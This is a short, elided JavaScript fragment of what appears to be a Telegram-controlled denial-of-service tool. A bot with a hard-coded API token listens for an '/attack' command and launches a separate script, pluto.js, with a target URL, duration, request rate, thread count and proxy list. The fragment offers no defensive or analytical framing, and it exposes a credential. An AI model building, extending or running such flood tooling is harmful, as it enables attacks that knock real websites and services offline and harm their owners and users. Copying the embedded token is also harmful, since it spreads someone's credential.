...
const bot = new TelegramBot('6843379565:AAGhqGjc-IxkMM2FDm0M_iO-it-eJ5fP9k8', { polling: true });
...
bot.onText(/\/attack (.+)/, (msg, match) => {
  ...
  const browserProcess = spawn('node', ['pluto.js', url, timeArg, rate, thread, proxyFile], { cwd: __dirname });
